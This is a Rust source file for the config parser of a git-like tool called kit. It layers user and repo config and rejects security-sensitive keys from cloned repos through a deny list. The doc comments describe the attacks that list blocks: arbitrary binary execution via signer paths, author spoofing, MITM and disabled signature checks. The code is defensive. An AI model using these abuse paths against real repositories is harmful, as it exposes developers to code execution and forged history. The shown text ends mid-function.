//! The `.kit/config` parser, writer and user config path rules.
//!
//! On-disk format: `key = value`, one per line, lines starting with `#`
//! ignored. User-facing short-hand values for `user.identity`:
//! `ed25519:<hex>`, `mid:<u64>`, or raw `[kind][len][bytes]` hex.
//!
//! ## Config scope
//!
//! There are two layered config files. Higher-priority values win:
//!
//! 1. **Repo-scoped** (`<repo>/.kit/config`) — per-project knobs that
//!    travel with a clone: branch defaults and remote endpoints.
//!    Security-sensitive keys are rejected here, see
//!    [`REPO_FORBIDDEN_KEYS`].
//! 2. **User-scoped** (`$XDG_CONFIG_HOME/kit/config`, default
//!    `~/.config/kit/config`) — per-user knobs that decide what gets
//!    signed, what gets executed, and what hosts to trust. A hostile
//!    cloned repo cannot influence these.
//! 3. **Built-in defaults** — fall-back when neither file sets a value.
//!
//! Merge order: defaults → user → repo (filtered). The repo file is
//! parsed last so its safe values take precedence over defaults. A
//! security-sensitive key in the repo file is reported to the
//! [`Observer`] as a [`ConfigEvent`] and otherwise ignored. See
//! `docs/THREAT-MODEL.md` for the threat model that motivates the split.
//!
//! This module reads no environment variable and keeps no global state.
//! The caller passes an [`Environment`] that carries the home directory,
//! the XDG config directory and the `-c` overrides.

use kit_core::bounded_read;
use kit_core::hash::from_hex_bytes;
use kit_core::layout::RepoLayout;
use kit_core::observer::{NoopObserver, Observer};
use std::fmt::Write as _;
use std::fs;
use std::io;
use std::io::Write as _;
use std::path::{Path, PathBuf};

use thiserror::Error;

use crate::Environment;

pub const CONFIG_FILE: &str = ".kit/config";
/// Longest config file that kit reads (1 MiB).
pub const MAX_CONFIG_BYTES: u64 = 1024 * 1024;
pub const USER_CONFIG_SUBPATH: &str = "kit/config";
pub const DEFAULT_SIGNING_KEY: &str = ".kit/keys/default.key";
pub const DEFAULT_SIGNER: &str = "file";
pub const DEFAULT_KEY_BACKEND: &str = "software";
pub const DEFAULT_KEY_REF: &str = "software:default";
pub const DEFAULT_SECP256K1_KEY_REF: &str = "software:default-secp256k1";
pub const DEFAULT_P256_KEY_REF: &str = "software:default-p256";

/// A security-relevant fact that config loading reports instead of printing.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum ConfigEvent {
    /// A user-scoped key appeared in the per-repo config file. The loader
    /// dropped it.
    IgnoredRepoKey {
        /// The normalized key.
        key: String,
        /// The config file that held the key.
        origin: PathBuf,
    },
    /// A user-scoped key appeared in a `-c` override. The loader dropped it.
    IgnoredOverride {
        /// The normalized key.
        key: String,
    },
}

/// Keys that MUST NOT be settable via the per-repo `<repo>/.kit/config`
/// because a hostile clone could otherwise:
///
/// * redirect `signing_key` to overwrite arbitrary files on disk or to
///   sign attacker-chosen content with the user's real key,
/// * spoof the commit author by pinning `user.identity` to attacker-
///   chosen bytes while the victim's real signing key still signs the
///   object,
/// * point `attest.external_signer_path` / `_args` at any binary on the
///   host (RCE under the user's UID),
/// * **select** a user-scoped external signer or non-Ed25519 algorithm
///   to confused-deputy through it: even though the path is
///   user-scoped, the *selector* (`attest.signer`,
///   `attest.default_algorithm`) is enough to weaponize an existing
///   user-trusted binary or key against attacker-chosen content,
/// * mark a repo-controlled HTTP/S3 remote as trusted for ambient
///   environment credentials,
/// * disable SSH host-key verification on `kit push` (MITM),
/// * add a certificate authority they control to the HTTPS trust roots
///   (`http.sslcainfo`), so they can intercept a TLS connection,
/// * disable post-fetch commit/remix/tag signature verification
///   (`pull.require_signed`) — a hostile repo must not be able
///   to switch off the one check that would otherwise reject its own
///   unsigned/forged history on the next clone/pull/fetch.
///
/// They are accepted from the user-scoped config only.
pub const REPO_FORBIDDEN_KEYS: &[&str] = &[
    "user.identity",
    "trusted_remote_endpoint",
    "admission_helper",
    "signer",
    "transport_auth",
    "pull.require_signed",
    "key.backend",
    "key.default_ref",
    "key.ed25519_ref",
    "key.secp256k1_ref",
    "key.p256_ref",
    "signing_key",
    "ssh.strict_host_key_checking",
    "ssh.user_known_hosts_file",
    "ssh.identity_file",
    "http.sslcainfo",
    "attest.signer",
    "attest.default_algorithm",
    "attest.external_signer_path",
    "attest.external_signer_args",
    "attest.external_signer_timeout_secs",
    "attest.secp256k1_key_path",
    "attest.p256_key_path",
    "grant.webauthn_rp",
];

/// User-scoped exact keys and the dynamic named-remote admission allowlist key.
#[must_use]
pub fn is_repo_forbidden_key(key: &str) -> bool {
    REPO_FORBIDDEN_KEYS.contains(&key)
        || key
            .strip_prefix("remote.")
            .and_then(|rest| rest.strip_suffix(".admission_headers"))
            .is_some_and(|name| !name.is_empty())
}

/// Source of a parsed config line — used to decide whether a key is
/// allowed (`Repo` rejects [`REPO_FORBIDDEN_KEYS`]; `User` accepts
/// everything).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfigScope {
    Repo,
    User,
}

/// Full in-memory representation of merged config (user + repo +
/// defaults). All fields default to empty / documented defaults;
/// readers that want a known-good default file should call
/// [`read_or_default`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Config {
    /// Hex-encoded Identity: `[kind:u8][len:u16 LE][bytes]`. Empty =
    /// derive from the signing key's public key at commit time.
    pub user_identity: String,
    /// Exact remote endpoint the user has explicitly trusted for
    /// ambient HTTP/S3 environment credentials. User-scoped only.
    pub trusted_remote_endpoint: String,
    /// Absolute executable path for the user-scoped admission helper.
    pub admission_helper: String,
    /// Per-remote extra header allowlists, separate from endpoint listings.
    pub remote_admission_headers: std::collections::BTreeMap<String, String>,
    pub signing_key: String,
    pub default_branch: String,
    pub remote_endpoint: String,
    pub remote_bucket: String,
    pub remote_type: String,
    pub ssh_strict_host_key_checking: String,
    pub ssh_user_known_hosts_file: String,
    pub ssh_identity_file: String,
    /// Extra PEM certificate authorities for native HTTPS remote connections.
    /// `KIT_SSL_CA_FILE` overrides this normally layered `http.sslCAInfo` key.
    pub http_ssl_ca_info: String,
    /// Write-auth scheme for `kit+https://` / `kit+http://` remotes
    /// (`kit-transport-connect::ConnectTransport`). Empty/`"bearer"`
    /// (default) sends `KIT_API_TOKEN` as a Bearer token.
    /// `"envelope"` ADDITIONALLY signs every write RPC
    /// (`UpdateRef`/`AdvanceRefs`/`UploadPack`) with an Ed25519 write
    /// envelope, reusing the exact SAME signer resolution as commit
    /// signing — [`Self::signer`] / [`Self::signing_key`] /
    /// [`KeyConfig::ed25519_ref`](KeyConfig::ed25519_ref) — see
    /// `remote_dispatch::envelope_signer_from_config`. User-scoped only:
    /// request authorization is a separate use of the ambient identity.
    /// Destination trust is checked before loading a signing key.
    pub transport_auth: String,
    /// `grant.webauthn_rp`: the `WebAuthn` relying parties whose assertions
    /// `kit grant create --webauthn-assertion` and the grant store accept
    /// (SPEC-WRITE-GRANTS §4.3). Each entry is `<rp_id> <origin>...`; the
    /// key may repeat and one value may hold several entries separated by
    /// `|`. User-scoped only (a repository must not choose which relying
    /// party vouches for an owner).
    pub grant_webauthn_rp: Vec<String>,
    /// Commit-signing selector. User-scoped only.
    pub signer: String,
    /// `pull.require_signed` — gates whether `clone`/`pull`/`fetch` verify
    /// every newly-fetched commit/remix/tag's Ed25519 signature before
    /// publishing the remote-tracking ref. Empty (the
    /// documented default) and any value except `"false"`/`"0"`/`"no"`/
    /// `"off"` mean "verify, fail closed"; see
    /// [`Config::pull_require_signed_or_default`]. User-scoped only — a
    /// hostile repo config must not be able to silently disable the check
    /// that protects the clone against exactly that repo (see
    /// [`REPO_FORBIDDEN_KEYS`]).
    pub pull_require_signed: String,
    /// `[key]` section. User-scoped keystore selectors.
    pub key: KeyConfig,
    /// `[attest]` section. Separate struct so new attest knobs don't
    /// balloon the flat `Config`.
    pub attest: AttestConfig,
    /// Named remotes keyed by name (`remote.<name>.url` /
    /// `remote.<name>.type`). Repo-safe — addresses, same class as the
    /// flat `remote_endpoint`. The flat `remote_endpoint` /
    /// `remote_type` act as the implicit `default` remote.
    pub remotes: std::collections::BTreeMap<String, RemoteEntry>,
    /// Per-branch upstream tracking keyed by local branch name
    /// (`branch.<branch>.remote` / `branch.<branch>.merge`). Repo-safe.
    pub branch_upstreams: std::collections::BTreeMap<String, Upstream>,
    /// Object-store durability schedule: empty/`batch` (default) =
    /// batched commit-time flushes; `per-object` = strict historical
    /// full-flush-per-object schedule (SPEC-OBJECTS §10.1's stricter
    /// conforming option). Repo-safe: the non-default value only
    /// STRENGTHENS durability (and slows writes); it cannot weaken
    /// anything.
    pub durability_objects: String,
}

/// A named remote's stored address. `type` is a dispatch hint derived
/// from the URL scheme at `kit remote add` time.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RemoteEntry {
    pub url: String,
    pub remote_type: String,
}

/// Per-branch upstream: the remote name plus the remote branch this
/// local branch tracks (`branch.<b>.merge` stores the bare branch
/// name, e.g. `main`).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Upstream {
    pub remote: String,
    pub branch: String,
}

/// `[key]` section for keystore-backed signing. All fields are user-scoped.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct KeyConfig {
    /// Default backend for `kit key` commands.
    pub backend: String,
    /// Generic key reference.
    pub default_ref: String,
    /// Ed25519 key reference.
    pub ed25519_ref: String,
    /// secp256k1 key reference.
    pub secp256k1_ref: String,
    /// P-256 key reference.
    pub p256_ref: String,
}

impl KeyConfig {
    #[must_use]
    pub fn backend_or_fallback(&self) -> &str {
        if self.backend.is_empty() {
            DEFAULT_KEY_BACKEND
        } else {
            self.backend.as_str()
        }
    }

    #[must_use]
    pub fn default_ref_or_fallback(&self) -> &str {
        if self.default_ref.is_empty() {
            DEFAULT_KEY_REF
        } else {
            self.default_ref.as_str()
        }
    }

    #[must_use]
    pub fn ed25519_ref_or_fallback(&self) -> &str {
        if self.ed25519_ref.is_empty() {
            self.default_ref_or_fallback()
        } else {
            self.ed25519_ref.as_str()
        }
    }

    #[must_use]
    pub fn secp256k1_ref_or_fallback(&self) -> &str {
        if self.secp256k1_ref.is_empty() {
            if self.default_ref.is_empty() {
                DEFAULT_SECP256K1_KEY_REF
            } else {
                self.default_ref.as_str()
            }
        } else {
            self.secp256k1_ref.as_str()
        }
    }

    #[must_use]
    pub fn p256_ref_or_fallback(&self) -> &str {
        if self.p256_ref.is_empty() {
            if self.default_ref.is_empty() {
                DEFAULT_P256_KEY_REF
            } else {
                self.default_ref.as_str()
            }
        } else {
            self.p256_ref.as_str()
        }
    }
}

/// Parsed config with per-layer provenance preserved so callers can
/// distinguish "repo configured this" from "user explicitly trusted
/// this".
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct LayeredConfig {
    pub merged: Config,
    pub user: Config,
    pub repo: Config,
}

/// `[attest]` section. All fields optional with documented defaults; a
/// fresh repo's config file has none of them set.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct AttestConfig {
    /// One of `"ed25519"`, `"secp256k1"`, `"p256"`. Empty = `"ed25519"`.
    pub default_algorithm: String,
    /// One of `"repo-key"`, `"external"`, `"keystore"`. Empty = `"repo-key"`.
    pub signer: String,
    /// Absolute path to the external signer binary. Required when
    /// `signer = "external"`. User-scoped only.
    pub external_signer_path: String,
    /// Extra argv tokens to pass to the external signer subprocess.
    /// Each `Vec` entry is one argv entry — the stored list maps 1:1
    /// to `std::process::Command::args`. On disk, encoded as a
    /// pipe-separated string: `attest.external_signer_args = sign|--tag|demo`.
    /// User-scoped only.
    pub external_signer_args: Vec<String>,
    /// Wall-clock budget (in seconds) for the entire external-signer
    /// conversation: spawn → request-write → response-read →
    /// stderr-drain → child-exit. On expiry kit kills and reaps the
    /// child. Empty / 0 = use the crate default (120s, generous for
    /// hardware touch/PIN/biometric). User-scoped only — see
    /// [`REPO_FORBIDDEN_KEYS`] (a hostile repo must not be able to set a
    /// 0s "deny" timeout or a multi-hour hang).
    pub external_signer_timeout_secs: Option<u64>,
    /// Per-algorithm repo-key paths for non-ed25519 signing.
    /// User-scoped only — see [`REPO_FORBIDDEN_KEYS`].
    pub secp256k1_key_path: String,
    pub p256_key_path: String,
}

impl AttestConfig {
    #[must_use]
    pub fn default_algorithm_or_fallback(&self) -> &str {
        if self.default_algorithm.is_empty() {
            "ed25519"
        } else {
            self.default_algorithm.as_str()
        }
    }

    #[must_use]
    pub fn signer_or_fallback(&self) -> &str {
        if self.signer.is_empty() {
            "repo-key"
        } else {
            self.signer.as_str()
        }
    }

    #[must_use]
    pub fn secp256k1_key_path_or_default(&self) -> &str {
        if self.secp256k1_key_path.is_empty() {
            ".kit/keys/secp256k1.key"
        } else {
            self.secp256k1_key_path.as_str()
        }
    }

    #[must_use]
    pub fn p256_key_path_or_default(&self) -> &str {
        if self.p256_key_path.is_empty() {
            ".kit/keys/p256.key"
        } else {
            self.p256_key_path.as_str()
        }
    }
}

impl Config {
    /// Return a Config with documented defaults filled in.
    #[must_use]
    pub fn with_defaults() -> Self {
        Self {
            signing_key: DEFAULT_SIGNING_KEY.to_owned(),
            default_branch: DEFAULT_BRANCH.to_owned(),
            signer: DEFAULT_SIGNER.to_owned(),
            key: KeyConfig {
                backend: DEFAULT_KEY_BACKEND.to_owned(),
                default_ref: String::new(),
                ed25519_ref: String::new(),
                secp256k1_ref: String::new(),
                p256_ref: String::new(),
            },
            ..Self::default()
        }
    }
}

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("I/O: {0}")]
    Io(#[from] io::Error),
    #[error("invalid config value — control characters are not permitted")]
    InvalidValue,
    /// A config line, or a `-c` override, that kit refuses. Config fails
    /// closed: an unknown key, a line without `=` and a malformed value are
    /// all errors, so a typo in a security key never turns the check off.
    #[error("{location}: {reason}")]
    Rejected { location: String, reason: String },
    #[error("{0}")]
    NoConfigHome(String),
    #[error("config file {0} exceeds the size limit")]
    TooLarge(String),
    #[error("invalid user.identity: {0}")]
    InvalidUserIdentity(&'static str),
    #[error("invalid http.sslCAInfo path: {0}")]
    InvalidHttpCaPath(&'static str),
    #[error(
        "key path must not contain `..`; relative paths must stay under `.kit/keys/` and absolute paths must stay under `$HOME`: {0}"
    )]
    InvalidKeyPath(String),
}

/// Validate that a key-file path (`signing_key`, `attest.*_key_path`,
/// `ssh.*_file`) cannot escape via `..` traversal. Empty strings pass
/// — callers fall back to the documented default.
impl Config {
    /// Resolve `http.sslCAInfo` for a native HTTPS connection. Relative paths
    /// start at the worktree root; `~` and `~/` use the home directory of
    /// `environment`. The stored config value remains unchanged for normal
    /// config roundtrips.
    ///
    /// # Errors
    /// A tilde path without a home directory, or unsupported `~user` syntax.
    pub fn ssl_ca_file_path(
        &self,
        layout: &RepoLayout,
        environment: &Environment,
    ) -> Result<Option<PathBuf>, ConfigError> {
        let value = self.http_ssl_ca_info.as_str();
        if value.is_empty() {
            return Ok(None);
        }
        let path = if value == "~" || value.starts_with("~/") {
            let home = environment
                .home
                .as_deref()
                .filter(|directory| !directory.as_os_str().is_empty())
                .ok_or(ConfigError::InvalidHttpCaPath(
                    "the home directory is unavailable for a tilde path",
                ))?;
            let mut path = home.to_path_buf();
            if let Some(rest) = value.strip_prefix("~/") {
                path.push(rest);
            }
            path
        } else if value.starts_with('~') {
            return Err(ConfigError::InvalidHttpCaPath(
                "use ~/ or an absolute path, not ~user",
            ));
        } else {
            PathBuf::from(value)
        };
        Ok(Some(if path.is_absolute() {
            path
        } else {
            layout.worktree_root().join(path)
        }))
    }

    /// Map `durability.objects` onto the object-store sync policy.
    /// Unknown values fall back to the batched default rather than
    /// erroring — config load must not brick the repo.
    #[must_use]
    pub fn object_sync_policy(&self) -> kit_core::store::SyncPolicy {
        match self.durability_objects.trim() {
            "per-object" | "per_object" => kit_core::store::SyncPolicy::PerObject,
            _ => kit_core::store::SyncPolicy::Batch,
        }
    }

    /// Effective `pull.require_signed`: `true` unless the
    /// user-scoped config explicitly disabled it. Empty (unset, the
    /// documented default) and any unrecognized value are treated as
    /// "verify" — only an explicit falsy spelling opts out, so a typo in
    /// the config file fails closed rather than silently disabling the
    /// check.
    #[must_use]
    pub fn pull_require_signed_or_default(&self) -> bool {
        !matches!(
            self.pull_require_signed
                .trim()
                .to_ascii_lowercase()
                .as_str(),
            "false" | "0" | "no" | "off"
        )
    }

    /// `true` iff [`Self::transport_auth`] selects the Ed25519 write-envelope
    /// auth mode (case-insensitive `"envelope"`). Empty (the default) and
    /// any other value mean the unchanged bearer-token-only behavior.
    #[must_use]
    pub fn transport_auth_envelope(&self) -> bool {
        self.transport_auth.trim().eq_ignore_ascii_case("envelope")
    }
}

pub fn validate_key_path(value: &str) -> Result<(), ConfigError> {
    if value.is_empty() {
        return Ok(());
    }
    let p = Path::new(value);
    for comp in p.components() {
        if matches!(comp, std::path::Component::ParentDir) {
            return Err(ConfigError::InvalidKeyPath(value.to_owned()));
        }
    }
    Ok(())
}

/// Resolve a configured signing-key path.
///
/// Policy:
/// - relative paths are allowed only under `<repo>/.kit/keys/`
/// - absolute paths are allowed only under the home directory that
///   `environment` carries. That directory must be absolute and must not be
///   the filesystem root, so an empty or `/` home admits no absolute path.
pub fn resolve_key_path(
    layout: &RepoLayout,
    environment: &Environment,
    value: &str,
) -> Result<PathBuf, ConfigError> {
    validate_key_path(value)?;
    let path = Path::new(value);
    if path.is_absolute() {
        let Some(home) = key_home(environment) else {
            return Err(ConfigError::InvalidKeyPath(value.to_owned()));
        };
        return if path.starts_with(home) {
            Ok(path.to_path_buf())
        } else {
            Err(ConfigError::InvalidKeyPath(value.to_owned()))
        };
    }

    // A relative key path is repo-relative with a mandatory
    // `.kit/keys/` prefix. Resolve the `.kit/` component against the
    // layout's COMMON dir — the one shared key store — so a linked
    // worktree signs with the same repo keys as the main tree.
    // Single-worktree repos resolve byte-identically to the historical
    // `<root>/.kit/…` join.
    let Ok(under_kit) = path.strip_prefix(kit_core::KIT_DIR) else {
        return Err(ConfigError::InvalidKeyPath(value.to_owned()));
    };
    let joined = layout.common_dir().join(under_kit);
    let repo_keys = layout.keys_dir();
    if !joined.starts_with(&repo_keys) {
        return Err(ConfigError::InvalidKeyPath(value.to_owned()));
    }
    Ok(joined)
}

/// The home directory that bounds absolute key paths. `None` unless it is
/// absolute and has at least one normal component.
fn key_home(environment: &Environment) -> Option<&Path> {
    let home = environment.home.as_deref()?;
    let has_name = home
        .components()
        .any(|part| matches!(part, std::path::Component::Normal(_)));
    (home.is_absolute() && has_name).then_some(home)
}

/// Split a pipe-separated argv string into argv tokens.
#[must_use]
pub fn parse_pipe_list(s: &str) -> Vec<String> {
    if s.is_empty() {
        return Vec::new();
    }
    s.split('|').map(str::to_owned).collect()
}

/// Validate a config value has no control bytes below 0x20 (except
/// tab) and no 0x7f.
pub fn validate_value(v: &str) -> Result<(), ConfigError> {
    for b in v.bytes() {
        if b < 0x20 || b == 0x7f {
            return Err(ConfigError::InvalidValue);
        }
    }
    Ok(())
}

/// Resolve the user-scoped config file path:
/// `<xdg_config_home>/kit/config`, falling back to `<home>/.config/kit/config`.
///
/// # Errors
/// As [`xdg_config_home`].
pub fn user_config_path(environment: &Environment) -> Result<PathBuf, ConfigError> {
    xdg_config_home(environment)
        .map(|d| d.join(USER_CONFIG_SUBPATH))
        .map_err(ConfigError::NoConfigHome)
}

/// Read the merged config: defaults, then the user-scoped file, then the
/// repo-scoped file (filtered to non-sensitive keys), then the `-c`
/// overrides of `environment`. Missing files are not errors; the per-layer
/// absence simply leaves the lower layer's value in place.
///
/// If the repo file or an override sets a key listed in
/// [`REPO_FORBIDDEN_KEYS`], `observer` receives a [`ConfigEvent`] and the
/// value is dropped.
pub fn read_or_default(
    layout: &RepoLayout,
    environment: &Environment,
    observer: &dyn Observer<ConfigEvent>,
) -> Result<Config, ConfigError> {
    let mut cfg = Config::with_defaults();
    apply_file(
        &mut cfg,
        &user_config_path(environment)?,
        ConfigScope::User,
        observer,
    )?;
    apply_file(&mut cfg, &layout.config_file(), ConfigScope::Repo, observer)?;
    // `-c <key>=<val>` one-shot overrides apply to BOTH the layered and the
    // flat read path, so `kit -c … <any-command>` is honored uniformly
    // (commit/merge/etc. read through here). Same forbidden-key enforcement.
    apply_overrides(&mut cfg, environment, observer)?;
    Ok(cfg)
}

/// Read both raw layers plus the merged config. `observer` receives each
/// dropped key once, for the merged view only.
pub fn read_layered(
    layout: &RepoLayout,
    environment: &Environment,
    observer: &dyn Observer<ConfigEvent>,
) -> Result<LayeredConfig, ConfigError> {
    let mut merged = Config::with_defaults();
    let user_path = user_config_path(environment)?;
    let repo_path = layout.config_file();
    apply_file(&mut merged, &user_path, ConfigScope::User, observer)?;
    apply_file(&mut merged, &repo_path, ConfigScope::Repo, observer)?;
    // `-c <key>=<val>` one-shot overrides (git parity) are applied LAST, on
    // top of every file layer, but ONLY to the effective `merged` view —
    // never to `user`/`repo`, so they are never persisted by a later
    // `config::write`. They flow through the SAME forbidden-key enforcement
    // as a per-repo file: security-sensitive keys (`REPO_FORBIDDEN_KEYS`)
    // are refused, so `-c`
    // cannot spoof the signed author or redirect signing/transport trust.
    apply_overrides(&mut merged, environment, observer)?;

    let mut user = Config::default();
    apply_file(&mut user, &user_path, ConfigScope::User, &NoopObserver)?;

    let mut repo = Config::default();
    apply_file(&mut repo, &repo_path, ConfigScope::Repo, &NoopObserver)?;

    Ok(LayeredConfig { merged, user, repo })
}

/// Apply the `-c` overrides of `environment` to `cfg`, enforcing the same
/// forbidden-key rules a per-repo file gets. A forbidden
/// key is dropped and reported. An unknown key or a malformed value is
/// an error.
fn apply_overrides(
    cfg: &mut Config,
    environment: &Environment,
    observer: &dyn Observer<ConfigEvent>,
) -> Result<(), ConfigError> {
    for (raw_key, val) in &environment.config_overrides {
        let key = normalize_config_key(raw_key.trim());
        if is_repo_forbidden_key(&key) {
            observer.event(&ConfigEvent::IgnoredOverride { key });
            continue;
        }
        apply_kv(cfg, &key, val.trim()).map_err(|reason| ConfigError::Rejected {
            location: format!("-c {key}"),
            reason,
        })?;
    }
    Ok(())
}

/// Apply a single config file to `cfg` under the given scope. Missing
/// file → no-op (returns `Ok`). Config fails closed: an unknown key, a
/// line without `=` and a malformed value are errors. A forbidden key in
/// the repo scope is the one exception: it is dropped and reported to
/// `observer`.
pub(crate) fn apply_file(
    cfg: &mut Config,
    path: &Path,
    scope: ConfigScope,
    observer: &dyn Observer<ConfigEvent>,
) -> Result<(), ConfigError> {
    let Some(text) = read_config_text(path)? else {
        return Ok(());
    };
    apply_text(cfg, &text, path, scope, observer)
}

/// Read a config file, capped at [`MAX_CONFIG_BYTES`]. `Ok(None)` when absent.
fn read_config_text(path: &Path) -> Result<Option<String>, ConfigError> {
    let bytes = match bounded_read::read_capped(path, MAX_CONFIG_BYTES) {
        Ok(bytes) => bytes,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(e) if e.kind() == io::ErrorKind::InvalidData => {
            return Err(ConfigError::TooLarge(path.display().to_string()));
        }
        Err(e) => return Err(e.into()),
    };
    String::from_utf8(bytes)
        .map(Some)
        .map_err(|_| ConfigError::Rejected {
            location: path.display().to_string(),
            reason: "config file is not valid UTF-8".to_owned(),
        })
}

/// Apply config `text` to `cfg` under the given scope. `origin` names the
/// source in errors and events. Config fails closed: see [`apply_file`].
///
/// # Errors
/// [`ConfigError::Rejected`] for the first unknown key, line without `=`
/// or malformed value, with its line number.
pub fn apply_text(
    cfg: &mut Config,
    text: &str,
    origin: &Path,
    scope: ConfigScope,
    observer: &dyn Observer<ConfigEvent>,
) -> Result<(), ConfigError> {
    for (index, raw_line) in text.lines().enumerate() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let rejected = |reason: String| ConfigError::Rejected {
            location: format!("{}:{}", origin.display(), index + 1),
            reason,
        };
        let Some((k, v)) = line.split_once('=') else {
            return Err(rejected("expected `key = value`".to_owned()));
        };
        // Git matches config section + variable names case-insensitively,
        // so a hand-edited `User.Name` / `Core.AutoCRLF` must resolve like
        // its canonical form. Normalize BEFORE the forbidden-key check so a
        // case-variant (`User.Identity`) can't slip a security-sensitive key
        // into the per-repo layer. Subsection names (`remote.<name>`,
        // `branch.<branch>`) keep their case — they are case-sensitive in
        // git, and lowercasing them would corrupt named remotes on reload.
        let key = normalize_config_key(k.trim());
        let key = key.as_str();
        let val = v.trim();
        if scope == ConfigScope::Repo && is_repo_forbidden_key(key) {
            observer.event(&ConfigEvent::IgnoredRepoKey {
                key: key.to_owned(),
                origin: origin.to_path_buf(),
            });
            continue;
        }
        apply_kv(cfg, key, val).map_err(rejected)?;
    }
    Ok(())
}

/// Apply one parsed key/value pair to `cfg`. Config fails closed: an
/// unknown key or a malformed value returns the reason it is refused.
fn apply_kv(cfg: &mut Config, key: &str, val: &str) -> Result<(), String> {
    validate_value(val).map_err(|_| "value contains control characters".to_owned())?;
    match key {
        "user.identity" => val.clone_into(&mut cfg.user_identity),
        "trusted_remote_endpoint" => val.clone_into(&mut cfg.trusted_remote_endpoint),
        "admission_helper" => val.clone_into(&mut cfg.admission_helper),
        "signer" => {
            expect_one_of(key, val, &["file", "keystore"])?;
            val.clone_into(&mut cfg.signer);
        }
        "pull.require_signed" => {
            expect_one_of(
                key,
                val,
                &["true", "1", "yes", "on", "false", "0", "no", "off"],
            )?;
            val.clone_into(&mut cfg.pull_require_signed);
        }
        "key.backend" => val.clone_into(&mut cfg.key.backend),
        "key.default_ref" => val.clone_into(&mut cfg.key.default_ref),
        "key.ed25519_ref" => val.clone_into(&mut cfg.key.ed25519_ref),
        "key.secp256k1_ref" => val.clone_into(&mut cfg.key.secp256k1_ref),
        "key.p256_ref" => val.clone_into(&mut cfg.key.p256_ref),
        "signing_key" => val.clone_into(&mut cfg.signing_key),
        "default_branch" => val.clone_into(&mut cfg.default_branch),
        "durability.objects" => {
            expect_one_of(key, val, &["batch", "per-object", "per_object"])?;
            val.clone_into(&mut cfg.durability_objects);
        }
        "remote_endpoint" => val.clone_into(&mut cfg.remote_endpoint),
        "remote_bucket" => val.clone_into(&mut cfg.remote_bucket),
        "remote_type" => val.clone_into(&mut cfg.remote_type),
        "ssh.strict_host_key_checking" => {
            expect_one_of(key, val, &["yes", "no", "accept-new"])?;
            val.clone_into(&mut cfg.ssh_strict_host_key_checking);
        }
        "ssh.user_known_hosts_file" => val.clone_into(&mut cfg.ssh_user_known_hosts_file),
        "ssh.identity_file" => val.clone_into(&mut cfg.ssh_identity_file),
        "http.sslcainfo" => val.clone_into(&mut cfg.http_ssl_ca_info),
        "transport_auth" => {
            expect_one_of(key, val, &["bearer", "envelope"])?;
            val.clone_into(&mut cfg.transport_auth);
        }
        "grant.webauthn_rp" => cfg
            .grant_webauthn_rp
            .extend(parse_pipe_list(val).into_iter().filter(|e| !e.is_empty())),
        "attest.default_algorithm" => {
            expect_one_of(key, val, &["ed25519", "secp256k1", "p256"])?;
            val.clone_into(&mut cfg.attest.default_algorithm);
        }
        "attest.signer" => {
            expect_one_of(key, val, &["repo-key", "keystore", "external"])?;
            val.clone_into(&mut cfg.attest.signer);
        }
        "attest.external_signer_path" => val.clone_into(&mut cfg.attest.external_signer_path),
        "attest.external_signer_args" => {
            cfg.attest.external_signer_args = parse_pipe_list(val);
        }
        "attest.external_signer_timeout_secs" => {
            cfg.attest.external_signer_timeout_secs = if val.is_empty() {
                None
            } else {
                Some(val.parse::<u64>().map_err(|_| {
                    format!("invalid value for `{key}`: expected a whole number of seconds")
                })?)
            };
        }
        "attest.secp256k1_key_path" => val.clone_into(&mut cfg.attest.secp256k1_key_path),
        "attest.p256_key_path" => val.clone_into(&mut cfg.attest.p256_key_path),
        // Dotted section keys: `remote.<name>.{url,type}` (repo-safe
        // addresses) and `branch.<b>.{remote,merge}` (per-branch
        // upstream). Each remote endpoint still flows through the
        // per-endpoint gate, so a named remote cannot smuggle ambient
        // creds.
        _ if apply_section_kv(cfg, key, val)? => {}
        _ => return Err(format!("unknown config key `{key}`")),
    }
    Ok(())
}

/// Accept an empty value (the key is unset) or one of `allowed`, compared
/// without regard to case. Any other value is an error.
fn expect_one_of(key: &str, val: &str, allowed: &[&str]) -> Result<(), String> {
    if val.is_empty() || allowed.iter().any(|a| val.eq_ignore_ascii_case(a)) {
        return Ok(());
    }
    Err(format!(
        "invalid value `{val}` for `{key}` (expected one of: {})",
        allowed.join(", ")
    ))
}

/// Canonicalize a config key's case the way git does: the **section** and
/// **variable** names are case-insensitive (lowercased), but the
/// **subsection** — the middle segment of a `<section>.<subsection>.<var>`
/// key, e.g. the `<name>` in `remote.<name>.url` or the `<branch>` in
/// `branch.<branch>.remote` — is **case-sensitive** and preserved verbatim.
///
/// Two-segment keys (`user.identity`, `pull.require_signed`, …) have no subsection,
/// so both halves are lowercased. The split mirrors `apply_section_kv`'s
/// `splitn(3, '.')`, so the canonical form round-trips through it.
#[must_use]
pub fn normalize_config_key(key: &str) -> String {
    // git's key model: the FIRST `.` separates the section, the LAST `.`
    // separates the variable, and everything between is the (case-sensitive)
    // subsection — which may itself contain dots (`remote.a.b.url` →
    // subsection `a.b`, variable `url`). Section + variable are lowercased;
    // the subsection is preserved verbatim.
    match key.split_once('.') {
        Some((section, rest)) => match rest.rsplit_once('.') {
            Some((subsection, variable)) => format!(
                "{}.{subsection}.{}",
                section.to_ascii_lowercase(),
                variable.to_ascii_lowercase()
            ),
            None => format!(
                "{}.{}",
                section.to_ascii_lowercase(),
                rest.to_ascii_lowercase()
            ),
        },
        None => key.to_ascii_lowercase(),
    }
}

/// Apply a `<section>.<name>.<field>` key (named remotes, branch
/// upstreams). Returns `Ok(true)` if the key matched a known section/field,
/// `Ok(false)` if it did not, and an error if the name is not valid.
fn apply_section_kv(cfg: &mut Config, key: &str, val: &str) -> Result<bool, String> {
    let mut parts = key.splitn(3, '.');
    let (Some(section), Some(name), Some(field)) = (parts.next(), parts.next(), parts.next())
    else {
        return Ok(false);
    };
    if !matches!(
        (section, field),
